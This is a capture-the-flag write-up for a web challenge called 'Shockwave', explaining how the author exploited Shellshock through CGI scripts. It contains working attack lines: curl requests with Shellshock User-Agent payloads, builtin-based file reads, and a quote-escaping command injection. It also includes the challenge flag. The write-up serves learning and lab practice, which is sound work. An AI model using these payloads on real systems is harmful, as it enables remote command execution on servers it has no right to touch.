+++
title = 'Shockwave'
description = "A legacy diagnostics portal has been deployed for internal use. The system administrators have noted a vulnerability associated with it. Can you exploit it before it gets patched?"
category = 'Web'
solved = true
+++

| Info        	|                                                   	|
|-------------	|---------------------------------------------------	|
| Category    	| {{< param category >}}                            	|
| Description 	| {{< desc >}}                                      	|
| Endpoint    	| Provided by the platform, port `8080`             	|
| Flag        	| `HFCTF{sh3llshock_p1_cgi_env_variable_1nto_exec}` 	|

> [!CAUTION] TL;DR
> The diagnostics portal is vulnerable to the [Shellshock CVE](https://en.wikipedia.org/wiki/Shellshock_(software_bug)). Passing Bash commands to the `User-Agent` header gave access to the scripts of the CGI's `cgi-bi/` folder. One of the script was vulnerable to further command injection through the `User-Agent`, leaking the flag.

## Summary

The portal exposed two Bash scripts via the Common Gateway Interface.
These were vulnerable to Shellshock, allowing command injection to explore and read the scripts.
One of them was vulnerable to even more command injection, letting me find the flag and decode its `base64` contents.

## Initial Recon

I started by looking at the page of the diagnostics portal.
Entirely static, the page offered only a small possible hint in its source code.

```html
<div class="decoy">
	<p><!-- Debug: /tmp/decoy.txt exists --></p>
</div>
```

Otherwise, the page had two links, `/cg-bi/diagnostics.sh` and `/cgi-bi/check.sh`.
Both seemed to be running scripts, as they were using a `.sh`.

The `diagnostics` page showed
```text
System Diagnostics

DNS Resolution Test:

[IP1]
[IP2]

Network Connectivity Test:

Connectivity check passed
```

As for the `check` page, it showed
```text
System Status

Server is running

 14:37:26 up 11:07,  0 user,  load average: 6.09, 6.36, 6.49
```

Both were pure text in html elements, nothing more.

Gobuster gives nothing interesting back, and enumerating the host is useless, as other services are used for the [Nexus-Corp challenge]({{< relref "/writeups/hackfest26/nexus-corp/" >}}).

## Making Sense of It

At this point I was lost.
Most challenges I've done in Web usually were tricks on the page, like SQL Injection, XSS, or JWT forgery. 
I went to solve another challenge in the meantime, and an hour and half later I was back to it.

I searched around the web about vulnerabilities around exposed Bash scripts or this mysterious `cgi-bi/` folder.
As it turns out, a vulnerability called Shellshock was discovered in 2014 that affected Bash scripts.

> [!IMPORTANT] Shellshock
> [Shellshock](https://nvd.nist.gov/vul/detail/cve-2014-6271) is a vulnerability in Bash that executes commands concatenated after function definitions in the environment variables.
>
> **Why is Bash executing functions from environment variables in the first place?**
> The way Bash child processes inherit the parent process' functions is through environment variables.
> Bash serializes the function into a string passed as an environment variable given to the child process.
> ```text { class="no-linenos" }
> BASH_FUNC_hello%%=() { echo "Hello world"; }
> ```
> The vulnerable Bash versions would not properly stop parsing after the trailing `}` and would continue to parse following commands.
> Since the Common Interface Gateway (CFI) exposed through `cgi-bi/` maps the request headers into environment variables, a payload passed as a header could be executed on the server.

Given the name of the challenge was similar to the name of the vulnerability, I followed that path.
From this [website](https://hacktricks.wiki/e/network-services-pentesting/pentesting-web/cgi.html), I could test the vulnerability.

## Solution

1. **Verify the vulnerability** via the `User-Agent` header and CGI endpoint.

    I did not actually realize that `nmap` offered a script to test the vulnerability via 
    ```console { class="no-linenos" }
    $ nmap TARGET_IP -p 8080 --script=http-shellshock --script-args uri=/cgi-bi/check.sh
    ```
    so I tried by hand with cURL:

    ```console { hl_lines=[5,6] }
    $ curl -H 'User-Agent: () { :; }; echo; echo SHELLSHOCK_TEST' http://TARGET_IP:8080/cgi-bi/check.sh
    ...
    Transfer-Encoding: chunked
    Content-Type: text/x-sh

    SHELLSHOCK_TEST
    Content-type: text/html

    <html>
    <head><title>System Status</title></head>
    ...
    ```

    Lines 5 and 6 are the result of the Bash commands injected in the `User-Agent` header.

2. **Explore what's reachable** from the shell.

    Running the `help` command printed out everything that was available to run, mostly Bash builtins, no executables like `ls` or `cat`.
    By using the builtins, I was able to find available files and read the scripts generating the pages.

    > [!NOTE]- Available commands
    > ```text { hl_lines=[1,4,6,7,9] }
    > GNU bash, version 4.3.0(1)-release (x86_64-unknown-linux-gnu)
    > ...
    > 
    >  break [n]                               printf [-v var] format [arguments]
    >  ...
    >  case WORD in [PATTERN [| PATTERN]...)>  read [-ers] [-a array] [-d delim] [->
    >  cd [-L|[-P [-e]] [-@]] [dir]            readarray [-n count] [-O origin] [-s>
    >  ..
    >  echo [-neE] [arg ...]                   time [-p] pipeline
    >  ..
    >  help [-dms] [pattern ...]               { COMMANDS ; }
    > ```
    > 
    > We can see the version is vulnerable, and a couple commands we can use to mimic `ls` and `cat`.
    > 
    > We can mimic the `cat` command with the `read` builtin like so:
    > ```bash { class="no-linenos" }
    > while IFS= read -r line; do echo "$line"; done < file_to_read
    >```
    >
    > We can mimic the `ls` command with the `printf` builtin like so:
    > ```bash { class="no-linenos" }
    > printf %s\n path/*
    > ```

    > [!warning]- Dead End
    > The `decoy.txt` file, from the HTML source code comment of the portal page, had, of course, a fake flag.
    > ```text { hl_lines=[2,9] }
    > ...
    > > User-Agent: () { :; }; echo; while IFS= read -r line; do echo "$line"; done < /tmp/decoy.txt
    > > 
    > * Request completely sent off
    > < HTTP/1.1 200 OK
    > ...
    > < Content-Type: text/x-sh
    > < 
    > this_is_not_the_real_flag
    > ...
    > ```

    Exploring the `/usr/lib/cgi-bi/` via the builtins, we can find the following files:
    ```text
    /usr/lib/cgi-bin/bash /usr/lib/cgi-bin/check.sh /usr/lib/cgi-bin/diagnostics.sh
    /usr/lib/cgi-bin/echo /usr/lib/cgi-bin/exploit.sh /usr/lib/cgi-bin/exploit1.sh 
    /usr/lib/cgi-bin/linpeas.sh /usr/lib/cgi-bin/open
    ```
    The exploit files seemed empty, though.
    The `check.sh` file was just using `dig` to generate DNS infos too, nothing to exploit.

    > [!warning]- Dead End
    > I tried using `linpeas` (Linux Privilege Escalation Awesome Script) to have a reverse shell, or even [generate](https://www.revshells.com/) one, but it did not work, probably because we were not on the same network and I could not really open a port on the CTF network.
    > Usually, in HTB boxes, the challenge host is on the same network via a VPN.

3. **Read `diagnostics.sh` and exploit its vulnerability** via another Bash injection.

    Reading the `diagnostics.sh` script via the pseudo-`cat` command, I got
    ```bash { hl_lines=[4] }
    #!/bin/bash
    ...

    # Vulnerable: passes HTTP_USER_AGENT to subshell for logging
    USER_AGENT="${HTTP_USER_AGENT:-unknown}"
    /bin/bash -c "echo \"[INFO] Agent check from: $USER_AGENT\" >> /var/log/agent_access.log 2>/dev/null"

    ...
    ```
    I can inject a Bash command in the `User-Agent`, just like Shellshock, but use commands instead of builtins.
    This one would be different though, as I needed to escape the string to inject commands, like 
    ```bash { class="no-linenos" }
    test"; echo INJECTION_CONFIRMED;"
    ```
    Here, the highlighting is reversed, the command being the `echo`, while the `test` would be inside the logging.
    With this, I explored more of the machine, more easily, and found the flag in `/home/flagkeeper/flag.txt`.
    It was `SEZDVEZ7c2gzbGxzaG9ja19wMV9jZ2lfZW52X3ZhcmlhYmxlXzFudG9fZXhlY30=`, a `base64` string to decode and get the real flag.

## Takeaways

### Vulnerability

- The Shellshock vulnerability affects Bash scripts via environment variables.
- Those are exploitable when exposed through interfaces like CGI putting headers in environment variables.

### Methodology

- `nmap` has multiple scripts automating things, like HTTP vulnerabilities.
